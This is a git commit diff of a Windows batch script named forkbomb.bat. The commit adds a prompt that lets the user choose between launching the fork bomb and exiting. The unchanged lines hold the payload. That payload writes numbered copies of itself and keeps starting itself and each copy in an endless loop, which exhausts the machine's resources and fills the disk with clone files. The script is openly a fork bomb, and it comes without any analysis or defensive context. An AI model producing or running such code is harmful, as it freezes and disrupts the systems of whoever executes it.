62fc03e80846ddc6a81a7704094292875a7f0157
dantheman927 <137054934+dantheman927@users.noreply.github.com>
2024-10-24 15:59:54 +0100

    Update forkbomb.bat

--- forkbomb.bat
+++ forkbomb.bat
@@ -1,6 +1,16 @@
 @echo off
 set name=%0
 set clone=1
+
+
+echo ForkBomb-1-
+echo exit-2-
+set /p input=
+if /I "%input%" EQU "1" goto start
+if /I "%input%" EQU "2" goto exit
+
+
+
 :start
 :clone
 If not exist clone%clone%.bat (
@@ -12,4 +22,9 @@ GoTo clone
 start %name%
 start clone%clone%.bat
 GoTo start
+
+:exit
+exit 1
+
+
 pause
